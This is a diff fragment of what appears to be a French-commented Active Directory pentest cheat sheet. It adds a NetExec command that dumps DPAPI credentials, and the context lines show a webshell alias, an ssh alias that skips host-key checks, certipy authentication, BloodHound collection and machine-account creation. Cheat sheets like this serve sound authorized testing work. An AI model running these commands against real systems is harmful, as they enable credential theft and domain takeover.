@@ -13,6 +13,7 @@ phpshell #Pour avoir un webshell php
 alias ssh ='ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'
 certipy auth -pfx fichier.pfx -dc-ip $IP
 nxc smb $IP -u $USER -p $PASSWORD
+nxc smb $IP -u $USER -p $PASSWORD --dpapi
 nxc ldap $IP -u $USER -p $PASSWORD --bloodhound --collection All --dns-server $IP
 addcomputer.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP
 getinfoAD -u # users of AD
